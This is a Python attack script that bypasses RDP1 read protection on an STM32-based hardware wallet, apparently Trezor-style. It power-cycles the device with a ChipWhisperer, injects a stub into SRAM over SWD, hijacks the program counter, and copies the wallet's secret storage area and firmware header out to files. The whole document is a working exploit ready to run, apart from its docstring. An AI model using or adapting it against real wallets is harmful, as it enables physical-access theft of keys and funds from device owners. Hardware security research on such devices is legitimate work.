#!/usr/bin/env python3
"""
SRAM-stub flash dump — no bootloader, no BOOT1, no glitch 2.

RDP1 blocks flash reads through the DEBUG port, but code EXECUTING on the
core reads flash freely (the wallet firmware itself runs from flash). So:
 1. boot the firmware normally (BOOT0 low) -> healthy running core
 2. SWD-write the stub (scripts/flashstub.bin) into SRAM at 0x20000000
    (debug port CAN write SRAM at RDP1)
 3. halt the core (DHCSR), set PC into the stub, resume
 4. the stub copies storage (0x08008000, 32 KB) + firmware header
    (0x08010000, 64 B) into SRAM, parks in WFI
 5. SWD-read the copies out and save them

Markers in SRAM: 0x20001004=0x0000BEEF (started), 0x20001000=0xCAFEBABE (done)
"""
import argparse
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
STUB = os.path.join(HERE, 'flashstub.bin')
MARK_START = 0x20001004
MARK_DONE = 0x20001000
COPY_DST = 0x20010000      # 32 KB storage copy
HDR_DST = 0x20018000       # 64 B firmware header copy
DHCSR = 0xE000EDF0
HALT = 0xA05F0003
RUN = 0xA05F0001


def block_read(st, addr, size):
    out = bytearray()
    while size > 0:
        n = min(size, 1024)
        r = st.read_mem32(addr, n)
        if isinstance(r, (bytes, bytearray)):
            out += r
        elif isinstance(r, str):
            out += bytes.fromhex(r)
        elif isinstance(r, (list, tuple)):
            out += b''.join(int(x).to_bytes(4, 'little') for x in r)
        else:
            raise ValueError(f'unexpected read_mem32 return: {type(r)}')
        addr += n
        size -= n
    return bytes(out)


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument('--skip-boot', action='store_true',
                    help='target already running firmware; skip the power cycle')
    args = ap.parse_args()

    if not args.skip_boot:
        import chipwhisperer as cw
        scope = cw.scope()
        scope.io.tio1 = False    # BOOT0 low -> firmware boots, healthy core
        scope.io.target_pwr = False
        time.sleep(1.5)
        scope.io.target_pwr = True
        scope.dis()
        print('[+] power-cycled (BOOT0 low) - firmware booting')
        time.sleep(4)

    from swd.stlink import Stlink
    st = Stlink(swd_frequency=1800000)
    print(f'[+] SWD: {st.get_version().decode(errors="replace") if isinstance(st.get_version(), bytes) else st.get_version()}')

    stub = open(STUB, 'rb').read()
    while len(stub) % 4:
        stub += b'\x00'
    print(f'[*] stub: {len(stub)} bytes -> 0x20000000')

    # clear markers, write stub
    st.set_mem32(MARK_DONE, 0)
    st.set_mem32(MARK_START, 0)
    for i in range(0, len(stub), 4):
        st.set_mem32(0x20000000 + i, int.from_bytes(stub[i:i + 4], 'little'))

    # halt, hijack PC, resume
    print('[*] halting core...')
    st.set_mem32(DHCSR, HALT)
    time.sleep(0.2)
    dhcsr = st.get_mem32(DHCSR)
    print(f'    DHCSR=0x{dhcsr:08X}  S_HALT={(dhcsr >> 17) & 1}')
    if not (dhcsr >> 17) & 1:
        print('[-] core did not halt')
        return 1

    entry = 0x20000008 | 1    # code starts after the two vectors; Thumb bit
    print(f'[*] PC=0x{entry:08X}, resuming')
    st.set_reg(15, entry)     # 15 = PC
    st.set_mem32(DHCSR, RUN)
    time.sleep(1.0)

    m_start = st.get_mem32(MARK_START)
    m_done = st.get_mem32(MARK_DONE)
    print(f'[*] markers: started=0x{m_start:08X}  done=0x{m_done:08X}')
    if m_start != 0x0000BEEF:
        print('[-] stub did not run')
        return 1
    if m_done != 0xCAFEBABE:
        print('[-] stub ran but copy did not complete')
        return 1

    print('[*] reading the copies out of SRAM...')
    storage = block_read(st, COPY_DST, 0x8000)
    header = block_read(st, HDR_DST, 0x40)

    os.makedirs('FLASH', exist_ok=True)
    with open('FLASH/storage_0x08008000.bin', 'wb') as f:
        f.write(storage)
    with open('FLASH/fwheader_0x08010000.bin', 'wb') as f:
        f.write(header)

    print(f'[+] saved FLASH/storage_0x08008000.bin ({len(storage)} bytes)')
    print(f'[+] saved FLASH/fwheader_0x08010000.bin ({len(header)} bytes)')
    print(f'    storage first 32: {storage[:32].hex()}')
    print(f'    header  first 16: {header[:16].hex()}  ({header[:4]!r} - TRZF magic?)')
    idx = storage.find(bytes.fromhex('02003c00'))
    print(f'    norcow APP0/KEY2 entry (02 00 3C 00): '
          f'{"FOUND at +0x%04X" % idx if idx >= 0 else "not found"}')
    return 0


if __name__ == '__main__':
    sys.exit(main())
